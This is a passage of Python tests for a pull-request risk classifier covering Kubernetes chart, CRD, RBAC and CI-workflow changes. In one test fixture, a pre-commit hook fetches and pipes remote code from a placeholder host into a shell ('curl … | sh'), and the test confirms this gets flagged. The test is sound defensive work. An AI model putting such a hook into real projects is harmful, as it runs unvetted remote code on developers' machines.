    SCHEMA_HEAD = [("ctx", "spec:"), ("ctx", "  versions:"), ("ctx", "  - name: v1alpha1"), ("ctx", "    schema:"),
                   ("ctx", "      openAPIV3Schema:"), ("ctx", "        properties:"), ("ctx", "          spec:"),
                   ("ctx", "            properties:")]  # fmt: skip

    def test_keda_http_additive_crd_192(self):
        """#192: keda-add-ons-http 0.16 adds optional fields (with `required` and `enum` inside
        them), drops a default and loosens a validation rule. Jev said narrowed (0.81); nothing
        existing objects use is narrowed, so it's review, not risky."""
        rows = self.SCHEMA_HEAD + [
            ("ctx", "              placeholder:"), ("ctx", "                properties:"), ("ctx", "                  statusCode:"),
            ("del", "                    default: 503"), ("ctx", "                    type: integer"),
            ("add", "              maxPendingRequests:"), ("add", "                minimum: 1"), ("add", "                type: integer"),
            ("add", "              overflow:"), ("add", "                default: Reject"), ("add", "                enum:"),
            ("add", "                - Reject"), ("add", "                - Placeholder"), ("add", "                type: string"),
            ("add", "              staticRoutes:"), ("add", "                items:"), ("add", "                  properties:"),
            ("add", "                    path:"), ("add", "                      type: string"), ("add", "                  required:"),
            ("add", "                  - path"), ("add", "                type: array"),
        ]  # fmt: skip
        kdiff = crd_kdiff("CustomResourceDefinition interceptorroutes.http.keda.sh", rows, parent="HelmRelease system/keda-add-ons-http")
        self.assertEqual(rules.crd_narrowing(rules.render_hunks(kdiff)), [])
        diff = mkdiff("kubernetes/apps/system/keda/app-http-add-on/ocirepository.yaml", "  ref:\n-    tag: 0.15.0\n+    tag: 0.16.0", header="spec:")
        r = Scenario(diff, kdiff=kdiff, konflate=konflate_fresh(crds=1), author="renovate", notes=NO_NOTES,
                     title="fix(container): update image ghcr.io/home-operations/charts-mirror/keda-add-ons-http (0.15.0 ➔ 0.16.0)").run(
            Jev({"crd_schema_narrowed": 0.81}))  # fmt: skip
        self.verdict(r, "review")
        self.assertIn("compat.crd_schema_narrowed", codes(r, {"possible"}))
        self.assertNotIn("compat.crd_schema_narrowed", codes(r, {"probable", "established"}))

    def test_dragonfly_property_removed_186(self):
        """#186: the Dragonfly CRD drops `networkPolicyEnabled`. Risky from the render alone,
        whatever Jev says."""
        rows = self.SCHEMA_HEAD + [("del", "              networkPolicyEnabled:"), ("del", "                default: true"),
                                   ("del", "                type: boolean"), ("ctx", "              nodeSelector:")]  # fmt: skip
        kdiff = crd_kdiff("CustomResourceDefinition dragonflies.dragonflydb.io", rows, parent="HelmRelease database/dragonfly")
        self.assertEqual(rules.crd_narrowing(rules.render_hunks(kdiff)), ["property `networkPolicyEnabled` removed"])
        # As Konflate really rendered it: a fold marker, then the hunk starts below `properties:`.
        folded = [{"hunk": True, "fold": "g0", "count": 900}] + [{"kind": k, "html": h} for k, h in [
            ("ctx", "                type: integer"), ("del", "              networkPolicyEnabled:"), ("del", "                default: true"),
            ("del", "                description: Whether to create a NetworkPolicy."), ("del", "                type: boolean"),
            ("ctx", "              nodeSelector:")]]  # fmt: skip
        real = {"diff": {"resources": [{"kind": "CustomResourceDefinition", "title": "CustomResourceDefinition dragonflies.dragonflydb.io",
                                        "status": "changed", "parent": "HelmRelease database/dragonfly", "unified": folded}]}}  # fmt: skip
        self.assertEqual(rules.crd_narrowing(rules.render_hunks(real)), ["property `networkPolicyEnabled` removed"])
        diff =mkdiff("kubernetes/apps/database/dragonfly/app/ocirepository.yaml", "  ref:\n-    tag: v1.6.1\n+    tag: v1.7.0", header="spec:")
        r = Scenario(diff, kdiff=kdiff, konflate=konflate_fresh(crds=1), author="renovate").run(Jev({"crd_schema_narrowed": 0.03}))
        self.verdict(r, "risky")
        self.assertIn("compat.crd_schema_narrowed", codes(r, {"probable"}))

    def test_other_narrowing_shapes(self):
        head = self.SCHEMA_HEAD + [("ctx", "              mode:")]
        cases = {
            "enum value `Legacy` removed": [("ctx", "                enum:"), ("ctx", "                - Modern"), ("del", "                - Legacy")],
            "type `string` → `integer`": [("del", "                type: string"), ("add", "                type: integer")],
        }
        for want, rows in cases.items():
            got = rules.crd_narrowing(rules.render_hunks(crd_kdiff("CustomResourceDefinition x.example.io", head + rows)))
            self.assertEqual(got, [want])
        required = self.SCHEMA_HEAD + [("ctx", "              replicas:"), ("ctx", "                type: integer"),
                                       ("ctx", "            required:"), ("add", "            - replicas")]  # fmt: skip
        self.assertEqual(rules.crd_narrowing(rules.render_hunks(crd_kdiff("CustomResourceDefinition x.example.io", required))),
                         ["`replicas` newly required"])  # fmt: skip

    def action_bump_214(self, checks=None, config="auto", extra=""):
        """#214 as collected: one pinned-SHA line in validate.yaml, v5.0.0 → v7.0.0 of
        actions/setup-node, whose v6.0.0 notes list a breaking change (`breaking_notes` 0.82)."""
        path = ".github/workflows/validate.yaml"
        diff = mkdiff(path, """\
      - name: Setup Node.js
-        uses: actions/setup-node@a0853c24544627f65ddf259abe73b1d18a591444 # v5.0.0
+        uses: actions/setup-node@8207627860cc3a94a4e5ae0f1d9e2a0f4c7e5b6d # v7.0.0
        with:
          node-version: "24"
""", header="jobs:")  # fmt: skip
        notes = {"source": "renovate", "reason": "r", "sections": [
            {"version": "v6.0.0", "text": "### v6.0.0\n\n**Breaking Changes**\n\n- Limit automatic caching to npm"},
            {"version": "v7.0.0", "text": "### v7.0.0\n\n- Remove the dummy NODE_AUTH_TOKEN"}]}  # fmt: skip
        if config == "auto":
            config = {path: '      - uses: actions/setup-node@8207627 # v7.0.0\n        with:\n          node-version: "24"\n',
                      p.ROOT_LISTING: ".github\n.mise\nREADME.md\nkubernetes\n"}  # fmt: skip
        jev = Jev({"breaking_notes": 0.82, "breaking_affects_config": 0.05})
        r = Scenario(diff + extra, title="feat(github-action)!: Update action actions/setup-node (v5.0.0 ➔ v7.0.0)", author="renovate",
                     labels=["type/major"], notes=notes, config=config, checks=checks).run(jev)  # fmt: skip
        return r, jev

    RUN_214 = {"path": ".github/workflows/validate.yaml", "run_id": 37192392701, "url": "https://github.com/o/r/actions/runs/37192392701",
               "status": "completed", "conclusion": "success", "not_run": []}  # fmt: skip

    def test_action_bump_is_checked_against_its_inputs_214(self):
        """Its workflow said "there is no config to check it against": `config.json` was {} for
        a workflow, so `breaking_affects_config` was never asked. With the step's inputs and the
        repository root in view it is, and the answer names the finding for what it is."""
        r, jev = self.action_bump_214()
        self.assertIn("breaking_affects_config", jev.asked["raw"])
        self.assertIn('node-version: "24"', jev.states["raw"]["config"])
        self.assertIn(p.ROOT_LISTING, jev.states["raw"]["config"])
        self.verdict(r, "review", rule="R3")
        self.assertEqual(codes(r), {"compat.breaking_change_elsewhere"})
        # as it was collected before: not asked, and the vaguer finding
        r, jev = self.action_bump_214(config={})
        self.assertNotIn("breaking_affects_config", jev.asked["raw"])
        self.assertEqual(codes(r, ("possible",)), {"compat.breaking_change_applies"})

    def test_own_green_run_discharges_breaking_change_elsewhere_214(self):
        """The Validate run on #214's head had already run setup-node v7, every step green. That
        is the check the obligation asks for, so it is ruled out and recorded, not dropped."""
        r, _ = self.action_bump_214(checks=[self.RUN_214])
        self.verdict(r, "safe", rule="R4")
        f = next(x for x in r["findings"] if x["code"] == "compat.breaking_change_elsewhere")
        self.assertEqual(f["certainty"], "ruled_out")
        self.assertIn("checks", {e["source"] for e in r["evidence"] if e["id"] in f["evidence"]})
        self.assertEqual([c["code"] for c in r["context"] if c["code"] == "ctx.change_exercised"], ["ctx.change_exercised"])
        self.assertIn("37192392701", p.render_comment(r))

    def test_a_run_only_counts_when_it_ran_the_change_214(self):
        for why, checks in {
            "no run": [],
            "failed": [{**self.RUN_214, "conclusion": "failure", "not_run": None}],
            "still running": [{**self.RUN_214, "status": "in_progress", "conclusion": None, "not_run": None}],
            "a step was skipped": [{**self.RUN_214, "not_run": ["validate / Setup Node.js"]}],
            "jobs unreadable": [{**self.RUN_214, "not_run": None}],
            "another workflow's run": [{**self.RUN_214, "path": ".github/workflows/labeler.yaml"}],
        }.items():
            r, _ = self.action_bump_214(checks=checks)
            self.assertEqual((r["classification"], codes(r)), ("review", {"compat.breaking_change_elsewhere"}), why)
        # a workflow too long to send whole: Jev's "no" may not have seen the changed step's inputs
        long = {".github/workflows/validate.yaml": "x" * (p.BUDGET["config_per_file"] + 1)}
        r, _ = self.action_bump_214(checks=[self.RUN_214], config=long)
        self.assertEqual((r["classification"], codes(r)), ("review", {"compat.breaking_change_elsewhere"}))
        # a composite action changed too: no run lists its steps
        action = mkdiff(".github/actions/setup-mise/action.yaml", "-        uses: jdx/mise-action@v3.2.0\n+        uses: jdx/mise-action@v4.0.0")
        r, _ = self.action_bump_214(checks=[self.RUN_214], extra=action)
        self.verdict(r, "review", rule="R3")
        # an app in the same PR: the notes may be about it, and no workflow run exercises an app
        r, _ = self.action_bump_214(checks=[self.RUN_214], extra=DIGEST_BUMP)
        self.assertIn("compat.breaking_change_elsewhere", codes(r, ("established",)))

    def test_a_green_run_never_lowers_a_breaking_change_that_applies_214(self):
        """A break can be silent (a cache that is no longer restored): a passing run says the
        workflow didn't fail, not that nothing changed. Only "elsewhere" is discharged."""
        r, _ = self.action_bump_214(checks=[self.RUN_214])
        self.assertEqual(r["classification"], "safe")
        for affects, expect in ((0.85, ("risky", "probable")), (0.30, ("review", "possible"))):
            diff_r = Scenario(mkdiff(".github/workflows/validate.yaml", "-        uses: a/b@v5.0.0\n+        uses: a/b@v7.0.0"), author="renovate",
                              notes={"source": "renovate", "reason": "r", "sections": [{"version": "v6.0.0", "text": "BREAKING: x"}]},
                              config={".github/workflows/validate.yaml": "x"}, checks=[self.RUN_214],
                              ).run(Jev({"breaking_notes": 0.9, "breaking_affects_config": affects}))  # fmt: skip
            f = next(x for x in diff_r["findings"] if x["code"] == "compat.breaking_change_applies")
            self.assertEqual((diff_r["classification"], f["certainty"]), expect)

    def test_weak_breaking_lean_is_no(self):
        """#35, #45, #80, #147, #160: `breaking_notes` 0.21-0.26 on chore-only notes."""
        notes = {"source": "renovate", "sections": [{"version": "v0.9.0", "text": "### v0.9.0\n\n- chore: bump dependencies here"}], "reason": "r"}
        r = Scenario(DIGEST_BUMP, author="renovate", notes=notes, config={APP_HR: "x"}).run(Jev({"breaking_notes": 0.26}))
        self.verdict(r, "safe")
        r = Scenario(DIGEST_BUMP, author="renovate", notes=notes, config={APP_HR: "x"}).run(Jev({"breaking_notes": 0.36}))
        self.verdict(r, "review", uncertain=True)  # above the band: still on the fence

    def test_postgres_digest_bump_169(self):
        diff = mkdiff("kubernetes/components/postgres/cluster.yaml", """\
-  imageName: ghcr.io/cloudnative-pg/postgresql:18.0-standard-trixie@sha256:1111111111111111111111111111111111111111111111111111111111111111
+  imageName: ghcr.io/cloudnative-pg/postgresql:18.0-standard-trixie@sha256:2222222222222222222222222222222222222222222222222222222222222222
""", header="spec:")  # fmt: skip
        r = Scenario(diff, title="fix(container): update image ghcr.io/cloudnative-pg/postgresql:18.0-standard-trixie digest", author="renovate").run()
        self.verdict(r, "safe")
        self.assertNotIn("data.engine_major_upgrade", codes(r))

    def test_external_dns_webhook_178(self):
        """#178: a routine render and chore-only release notes. v1's blast × partner rule
        labelled it risky."""
        body = RENOVATE_NOTES.format(notes="- chore(deps): update module golang.org/x/net to v0.40.0")
        notes = {"source": "renovate", "sections": [{"version": "v0.9.0", "text": "### v0.9.0\n\n- chore(deps): update module golang.org/x/net to v0.40.0"}], "reason": "r"}
        diff = mkdiff("kubernetes/apps/network/external-dns/unifi/helmrelease.yaml", """\
          image:
            repository: ghcr.io/kashalls/external-dns-unifi-webhook
-            tag: v0.8.2@sha256:7f0ddbbc83a36a2a9d762e25eef9cafcb3adf0493068a27d72ae71087eafe6f0
+            tag: v0.9.0@sha256:22f4106f44a0b9ac3c97cf29bbfef93026c1164492152dc797a1d6dc86ddfbb5
""", header="spec:")  # fmt: skip
        k = {"state": "fresh", "summary": load("konflate_summary_178.json")}
        r = Scenario(diff, konflate=k, title="feat(container)!: update image ghcr.io/kashalls/external-dns-unifi-webhook (v0.8.2 ➔ v0.9.0)",
                     body=body, author="renovate", notes=notes).run()  # fmt: skip
        self.verdict(r, "safe")

    def test_tailscale_operator_description_only_crds_170(self):
        """#170: a CRD-heavy chart bump whose CRD changes are descriptions. The schema question
        isn't asked, and nothing about the CRDs escalates."""
        rows = [("ctx", "                key:"), ("del", "                  description: The key to select."),
                ("add", "                  description: The key to select from the ConfigMap."), ("ctx", "                  type: string")]  # fmt: skip
        kdiff = crd_kdiff("CustomResourceDefinition proxyclasses.tailscale.com", rows)
        diff = mkdiff("kubernetes/apps/network/tailscale-operator/app/ocirepository.yaml", "  ref:\n-    tag: 1.98.4\n+    tag: 1.102.4", header="spec:")
        jev = Jev()
        r = Scenario(diff, kdiff=kdiff, konflate=konflate_fresh(crds=1), title="fix(helm): update chart tailscale-operator (1.98.4 ➔ 1.102.4)",
                     author="renovate").run(jev)  # fmt: skip
        self.verdict(r, "safe")
        self.assertNotIn("rendered", jev.asked)  # nothing to ask about the render
        self.assertIn("ctx.crd_touched", {c["code"] for c in r["context"]})

    def test_snapshot_controller_secret_access_is_review_not_risky_171(self):
        """#171: a chart bump that grants an operator access to Secrets. That is worth a look,
        not a migration plan."""
        kdiff = {"diff": {"resources": [{"kind": "ClusterRole", "title": "ClusterRole snapshot-controller", "status": "changed",
                 "parent": "HelmRelease system/snapshot-controller",
                 "unified": [{"kind": "ctx", "html": "rules:"}, {"kind": "ctx", "html": "  - apiGroups: [\"\"]"},
                             {"kind": "ctx", "html": "    resources:"}, {"kind": "add", "html": "      - secrets"},
                             {"kind": "ctx", "html": "    verbs: [get, list]"}]}]}}  # fmt: skip
        diff = mkdiff("kubernetes/apps/system/snapshot-controller/app/ocirepository.yaml", "  ref:\n-    tag: 5.1.1\n+    tag: 5.3.0", header="spec:")
        r = Scenario(diff, kdiff=kdiff, title="feat(helm): update chart snapshot-controller (5.1.1 ➔ 5.3.0)", author="renovate").run()
        self.verdict(r, "review")
        f = next(x for x in r["findings"] if x["code"] == "sec.rbac_widened")
        self.assertEqual(f["certainty"], "possible")

    def test_kube_prometheus_stack_admission_hooks_172(self):
        def job(title, policy):
            rows = [("ctx", "  annotations:"), ("ctx", "    helm.sh/hook: pre-install,pre-upgrade"),
                    ("ctx", f"    helm.sh/hook-delete-policy: {policy}"), ("add", "        image: x:2")]  # fmt: skip
            return {"kind": "Job", "title": title, "status": "changed", "parent": "HelmRelease observability/kube-prometheus-stack",
                    "unified": [{"kind": k, "html": h, "folded": k == "ctx"} for k, h in rows]}  # fmt: skip

        k = {"state": "fresh", "summary": load("konflate_summary_172.json")}
        diff = mkdiff("kubernetes/apps/observability/kube-prometheus-stack/app/ocirepository.yaml", "  ref:\n-    tag: 77.0.0\n+    tag: 77.0.1", header="spec:")
        both = {"diff": {"resources": [job("Job observability/kube-prometheus-stack-admission-create", "before-hook-creation,hook-succeeded"),
                                       job("Job observability/kube-prometheus-stack-admission-patch", "before-hook-creation,hook-succeeded")]}}  # fmt: skip
        r = Scenario(diff, konflate=k, kdiff=both, title="fix(helm): update chart kube-prometheus-stack (77.0.0 ➔ 77.0.1)", author="renovate").run()
        self.verdict(r, "safe")
        # A hook that isn't recreated fails the apply, and kube-prometheus-stack is shared: risky.
        one = copy.deepcopy(both)
        one["diff"]["resources"][1] = job("Job observability/kube-prometheus-stack-admission-patch", "hook-failed")
        self.verdict(Scenario(diff, konflate=k, kdiff=one).run(), "risky")
        # Without the rendered diff, nobody can tell: review.
        self.verdict(Scenario(diff, konflate=k).run(), "review")

    CNPG_OCI = mkdiff("kubernetes/apps/database/cloudnative-pg/operator/app/ocirepository.yaml", "  ref:\n-    tag: 0.29.0\n+    tag: 0.29.1", header="spec:")
    CNPG_TITLE = "fix(container): update image ghcr.io/cloudnative-pg/charts/cloudnative-pg (0.29.0 ➔ 0.29.1)"
    CNPG_PARENT = "HelmRelease database/cloudnative-pg"

    def test_crd_schema_text_is_not_a_recovery_setting_176(self):
        """#176: clusters.postgresql.cnpg.io reworded a description under `bootstrap.recovery`.
        A schema names the recovery keys without setting anything; a backup object still counts."""
        rows = [("ctx", "              bootstrap:"), ("ctx", "                properties:"), ("ctx", "                  recovery:"),
                ("del", "                    description: Bootstrap the cluster from a backup."),
                ("add", "                    description: Bootstrap the cluster from a backup or from another cluster."),
                ("ctx", "                    type: object")]  # fmt: skip
        kdiff = crd_kdiff("CustomResourceDefinition clusters.postgresql.cnpg.io", rows, parent=self.CNPG_PARENT)
        r = Scenario(self.CNPG_OCI, kdiff=kdiff, konflate=konflate_fresh(crds=1), title=self.CNPG_TITLE, author="renovate", notes=NO_NOTES).run()
        self.verdict(r, "safe")
        self.assertNotIn("data.recovery_path_changed", codes(r))
        backup = {"diff": {"resources": [{"kind": "ScheduledBackup", "title": "ScheduledBackup default/paperless-postgres", "status": "changed",
                  "parent": self.CNPG_PARENT, "unified": [{"kind": "del", "html": "  schedule: 0 33 0 * * *"}, {"kind": "add", "html": "  schedule: 0 33 1 * * *"}]}]}}  # fmt: skip
        r = Scenario(self.CNPG_OCI, kdiff=backup, title=self.CNPG_TITLE, author="renovate", notes=NO_NOTES).run()
        self.assertIn("data.recovery_path_changed", codes(r, {"possible"}))

    def test_fence_sitting_on_a_capped_question_is_possible_176(self):
        """#176: Jev said 0.60 on `crd_schema_narrowed`. A yes there is capped at possible
        (review), so being unsure can't make the PR uncertain."""
        rows = self.SCHEMA_HEAD + [("ctx", "              modulus:"), ("ctx", "                format: int64"), ("add", "                minimum: 0"),
                                   ("ctx", "                type: integer")]  # fmt: skip
        kdiff = crd_kdiff("CustomResourceDefinition poolers.postgresql.cnpg.io", rows, parent=self.CNPG_PARENT)
        r = Scenario(self.CNPG_OCI, kdiff=kdiff, konflate=konflate_fresh(crds=1), title=self.CNPG_TITLE, author="renovate",
                     notes=NO_NOTES).run(Jev({"crd_schema_narrowed": 0.60}))  # fmt: skip
        self.verdict(r, "review", rule="R3")
        self.assertIn("compat.crd_schema_narrowed", codes(r, {"possible"}))
        self.assertNotIn("ev.model_indecisive", codes(r))

    def test_chart_notes_do_not_cover_the_app_176(self):
        """#176: the chart's notes were CI chores while the render moved the operator a minor.
        Without that image's notes it is a bounded gap, whatever the chart's own version does."""
        img = {"name": "ghcr.io/cloudnative-pg/cloudnative-pg", "from": "1.29.1", "to": "1.30.1", "refs": ["Deployment database/cloudnative-pg"]}
        chart = {"version": "v0.29.1", "text": "### v0.29.1\n\n- ci: add cert manager to renovate"}
        notes = {"source": "renovate", "sections": [chart], "reason": "r",
                 "images": [{**img, "reason": "no release tagged for this package in cloudnative-pg/cloudnative-pg", "covered": False}]}  # fmt: skip
        r = Scenario(self.CNPG_OCI, title=self.CNPG_TITLE, author="renovate", notes=notes).run()
        self.verdict(r, "review", rule="R3")
        gap = next(x for x in r["findings"] if x["code"] == "ev.release_notes_partial")
        self.assertEqual(gap["surface"], "database/cloudnative-pg")
        self.assertIn("1.29.1 → 1.30.1", gap["description"])
        app = {"version": "cloudnative-pg v1.30.0", "text": "### cloudnative-pg v1.30.0\n\n- feat: a primary lease"}
        notes = {"source": "renovate", "sections": [chart, app], "reason": "r", "images": [{**img, "reason": "GitHub releases", "covered": True}]}
        jev = Jev()
        r = Scenario(self.CNPG_OCI, title=self.CNPG_TITLE, author="renovate", notes=notes).run(jev)
        self.verdict(r, "safe")
        self.assertIn("a primary lease", jev.states["raw"]["release_notes"])

    def test_operator_bump_names_what_it_restarts_176(self):
        """#176: one changed image line in the operator's Deployment, and four databases restart.
        The registry knows which operators do that; it is context, so a patch stays safe."""
        img = lambda ns_name: [{"name": "ghcr.io/x/operator", "from": "1.29.2", "to": "1.29.3", "refs": [f"Deployment {ns_name}"], "upstream": "found"}]  # noqa: E731
        r = Scenario(self.CNPG_OCI, konflate=konflate_fresh(images=img("database/cloudnative-pg")), title=self.CNPG_TITLE, author="renovate", notes=NO_NOTES).run()
        self.verdict(r, "safe")
        note = next(c for c in r["context"] if c["code"] == "ctx.operand_restart")
        self.assertIn("every Postgres cluster", note["detail"])
        self.assertEqual(note["surface"], "database/cloudnative-pg")
        diff = mkdiff("kubernetes/apps/database/dragonfly/app/ocirepository.yaml", "  ref:\n-    tag: 1.7.0\n+    tag: 1.7.1", header="spec:")
        r = Scenario(diff, konflate=konflate_fresh(images=img("database/dragonfly")), title="fix(container): update dragonfly", author="renovate", notes=NO_NOTES).run()
        self.assertNotIn("ctx.operand_restart", {c["code"] for c in r["context"]})

    def test_components_resolve_against_spec_path(self):
        """A component is relative to `spec.path` (the app/ directory), not to ks.yaml. Resolved
        against the latter, every entry pointed at a directory that doesn't exist and was
        `unknown`, so `recon.component_contract_broken` never fired on a collected bundle."""
        ks = "kubernetes/apps/default/x/ks.yaml"
        doc = ("apiVersion: kustomize.toolkit.fluxcd.io/v1\nkind: Kustomization\nmetadata:\n  name: &app x\nspec:\n  components:\n"
               "    - ../../../../components/pg\n  path: ./kubernetes/apps/default/x/app\n  postBuild:\n    substitute:\n      APP: *app\n")  # fmt: skip
        component = "name: ${APP}\nschedule: ${PG_SCHEDULE}\nsize: ${PG_SIZE:=1Gi}\n"
        trees = {
            "base": {ks: doc + "      PG_SCHEDULE: daily\n", "kubernetes/components/pg/cluster.yaml": component},
            "head": {ks: doc, "kubernetes/components/pg/cluster.yaml": component},
        }

        def fake_git(*args, check=True):
            if args[0] == "show":
                rev, path = args[1].split(":", 1)
                text = trees[rev].get(path)
                return SimpleNamespace(stdout=text or "", returncode=0 if text is not None else 128)
            if args[0] == "ls-tree":
                rev, cdir = args[-1].split(":", 1)
                names = [x[len(cdir) + 1 :] for x in trees[rev] if x.startswith(cdir + "/")]
                return SimpleNamespace(stdout="\n".join(names), returncode=0 if names else 128)
            return SimpleNamespace(stdout="", returncode=1)

        with mock.patch.object(p, "git", side_effect=fake_git):
            comps = p.collect_components([{"status": "M", "path": ks}], "base", "head")
        self.assertEqual(comps, [{"ks": ks, "doc": "x", "component": "kubernetes/components/pg", "unknown": False,
                                  "missing_head": ["PG_SCHEDULE"], "missing_base": []}])  # fmt: skip
        diff = mkdiff(ks, "    substitute:\n      APP: *app\n-      PG_SCHEDULE: daily", header="spec:")
        self.assertIn("recon.component_contract_broken", codes(Scenario(diff, components=comps).run()))
        # No spec.path: nothing to resolve against, so the entry is unknown rather than guessed.
        (no_path,) = p.ks_documents(doc.replace("  path: ./kubernetes/apps/default/x/app\n", ""))
        self.assertIsNone(no_path["path"])

    def test_redaction_marker_is_not_a_secret(self):
        """collect exempts a bare PEM header (docs quote it) and then redacts the diff, which
        turns the header into a marker. Reading markers back as secrets undid the exemption:
        a doc line became `risk/risky`, "rotate it". secrets.json is the record instead."""
        path = "kubernetes/apps/default/whoami/app/configmap.yaml"
        raw = mkdiff(path, "data:\n+  note: a key starts with -----BEGIN PRIVATE KEY-----\n+  seen: '[REDACTED:github_token]'", header="apiVersion: v1")
        self.assertEqual(rules.scan_secrets(raw), [])
        redacted = rules.redact(raw)
        self.assertIn("[REDACTED:private_key]", redacted)
        self.assertNotIn("sec.secret_material_in_git", codes(Scenario(redacted).run()))
        # What collect did find still raises it, from secrets.json, on the redacted diff.
        r = Scenario(redacted, secrets=[{"path": path, "kind": "private_key"}]).run()
        self.assertIn("sec.secret_material_in_git", codes(r, {"established"}))

    def test_netpol_in_an_unplaced_rendered_resource(self):
        """A rendered resource that belongs to none of the PR's surfaces has no surface id. It
        went into the raw call's scope as None, next to a real id, and sorting the two raised
        TypeError: classify died instead of reporting the policy."""
        raw = mkdiff(APP_HR, "    networkPolicy:\n+      enabled: true", header="spec:")
        other = mkdiff("kubernetes/apps/media/plex/app/helmrelease.yaml", "    foo:\n-      bar: 1\n+      bar: 2", header="spec:")
        kdiff = {"diff": {"resources": [{"kind": "HelmRelease", "title": "HelmRelease elsewhere/thing", "status": "changed",
                                         "parent": "Kustomization elsewhere/thing",
                                         "unified": [{"kind": "ctx", "html": "    networkPolicy:"}, {"kind": "add", "html": "      enabled: true"}]}]}}  # fmt: skip
        jev = Jev()
        r = Scenario(raw, other, kdiff=kdiff).run(jev)
        self.assertIn("avail.traffic_newly_restricted", codes(r))
        self.assertIn("traffic_newly_restricted", jev.asked["raw"])
        self.assertIn("traffic_newly_restricted", jev.asked["rendered"])  # the rendered hit is the rendered call's


# ── Model boundaries ─────────────────────────────────────────────────────────────────────────


class TestBoundaries(Assertions):
    def test_reach_alone_never_escalates(self):
        """The same clean version bump on an app, a shared service and cluster foundation: all safe."""
        for path in (APP_HR, "kubernetes/apps/observability/kube-prometheus-stack/app/helmrelease.yaml",
                     "kubernetes/apps/kube-system/cilium/app/helmrelease.yaml", "kubernetes/apps/rook-ceph/rook-ceph/cluster/helmrelease.yaml"):  # fmt: skip
            diff = mkdiff(path, "      chart:\n-        version: 1.2.3\n+        version: 1.2.4", header="spec:")
            self.verdict(Scenario(diff).run(), "safe")

    def test_controller_configuration_is_a_bounded_gap_not_a_finding(self):
        """A config change is safe on an app or a shared service without control-plane stakes,
        and review on a controller (CNI, storage), because the render can't show what the
        controller does with it: an evidence gap, not a finding and not reach."""
        change = "          env:\n-            LOG: info\n+            LOG: debug"
        for path in (APP_HR, "kubernetes/apps/observability/kube-prometheus-stack/app/helmrelease.yaml"):
            self.verdict(Scenario(mkdiff(path, change, header="spec:")).run(), "safe")
        for path in ("kubernetes/apps/kube-system/cilium/app/helmrelease.yaml", "kubernetes/apps/rook-ceph/rook-ceph/cluster/helmrelease.yaml"):
            r = Scenario(mkdiff(path, change, header="spec:")).run()
            self.verdict(r, "review", rule="R3")
            self.assertEqual(codes(r), {"ev.unrendered_surface"})
            self.assertEqual(r["surfaces"][0]["evidence"]["render"], "limited")

    def test_reach_decides_gravity_of_a_real_finding(self):
        """replicas → 0 takes one app down (review) or a shared service (risky)."""
        k = lambda res: konflate_fresh(warnings=[{"level": "caution", "rule": "replicas-zero", "resource": res}])  # noqa: E731
        self.verdict(Scenario(DIGEST_BUMP, konflate=k("Deployment default/whoami")).run(), "review")
        diff = mkdiff("kubernetes/apps/database/dragonfly/app/helmrelease.yaml", "-  replicas: 1\n+  replicas: 0", header="spec:")
        self.verdict(Scenario(diff, konflate=k("Deployment database/dragonfly")).run(), "risky")

    def test_jev_cannot_lower_a_deterministic_finding(self):
        r = Scenario(DIGEST_BUMP, conflict=True).run(Jev({"description_matches": 1.0}))
        self.verdict(r, "risky")

    def test_evidence_is_per_surface(self):
        docs = mkdiff("README.md", "-a\n+b")
        r = Scenario(DIGEST_BUMP, docs, konflate={"state": "stale", "summary": {"reason": "rendering"}}).run()
        by = {s["id"]: s["sufficiency"] for s in r["surfaces"]}
        self.assertEqual(by, {"default/whoami": "insufficient", "docs": "sufficient"})

    def test_overlap_without_conflict_is_context(self):
        r = Scenario(DIGEST_BUMP, overlap=[APP_HR], base_diff=DIGEST_BUMP).run()
        self.verdict(r, "safe")
        self.assertIn("ctx.base_overlap", {c["code"] for c in r["context"]})

    def test_semantic_overlap_is_risky(self):
        r = Scenario(DIGEST_BUMP, overlap=[APP_HR], base_diff=DIGEST_BUMP).run(Jev({"semantic_overlap": 0.9}))
        self.verdict(r, "risky")
        self.assertIn("integrity.semantic_merge_hazard", codes(r))

    def test_network_policy(self):
        add = mkdiff("kubernetes/apps/default/whoami/app/networkpolicy.yaml", "+apiVersion: networking.k8s.io/v1\n+kind: NetworkPolicy\n+metadata:\n+  name: x", status="A")
        jev = Jev()
        r = Scenario(add).run(jev)
        self.verdict(r, "review")  # not risky just for existing
        self.assertIn("traffic_newly_restricted", jev.asked["raw"])
        self.verdict(Scenario(add).run(Jev({"traffic_newly_restricted": 0.9})), "review")  # one app: review
        shared = add.replace("default/whoami", "database/dragonfly")
        self.verdict(Scenario(shared).run(Jev({"traffic_newly_restricted": 0.9})), "risky")  # a shared service: risky
        remove = mkdiff("kubernetes/apps/default/whoami/app/networkpolicy.yaml", "-apiVersion: networking.k8s.io/v1\n-kind: NetworkPolicy", status="D")
        r = Scenario(remove).run()
        self.assertIn("ctx.networkpolicy_removed", {c["code"] for c in r["context"]})
        self.assertNotIn("avail.traffic_newly_restricted", codes(r))

    def test_execution_surfaces(self):
        pin = mkdiff(".github/workflows/validate.yaml", "      - uses: actions/checkout@" + "1" * 40 + " # v6\n-      - uses: jdx/mise-action@" + "2" * 40 + " # v4.2.0\n+      - uses: jdx/mise-action@" + "3" * 40 + " # v4.3.0")
        self.verdict(Scenario(pin, title="chore(github-action): update jdx/mise-action (v4.2.0 ➔ v4.3.0)", author="renovate").run(), "safe")
        step = mkdiff(".github/workflows/validate.yaml", "      - name: Lint\n-        run: just lint\n+        run: just lint --fix", header="jobs:")
        r = Scenario(step).run()
        self.verdict(r, "review")
        self.assertIn("exec.pre_merge_privileged", codes(r))
        hook = mkdiff(".lefthook.yaml", "pre-commit:\n  commands:\n+    fetch:\n+      run: curl https://example.invalid | sh")
        self.assertIn("exec.workstation_hook_changed", codes(Scenario(hook).run()))
        tools = mkdiff(".mise/config.toml", '[tools]\n-"aqua:helm/helm" = "3.18.0"\n+"aqua:helm/helm" = "3.18.1"')
        self.verdict(Scenario(tools, title="chore(mise): update helm (3.18.0 ➔ 3.18.1)", author="renovate").run(), "safe")
        hooks = mkdiff(".mise/config.toml", '[hooks]\n-postinstall = "lefthook install"\n+postinstall = "lefthook install && ./x.sh"')
        self.assertIn("exec.workstation_hook_changed", codes(Scenario(hooks).run()))
        automerge = mkdiff(".renovaterc.json5", '  packageRules: [\n+    { matchUpdateTypes: ["minor"], automerge: true },')
        self.assertIn("exec.review_bypass_widened", codes(Scenario(automerge).run()))

    def test_self_evaluation(self):
        r = Scenario(mkdiff(".github/scripts/pr-risk/pr_risk.py", "-x = 1\n+x = 2")).run()
        self.verdict(r, "review")
        self.assertIn("ev.self_evaluation", codes(r))

    def test_unrendered_host_surface_is_a_bounded_gap(self):
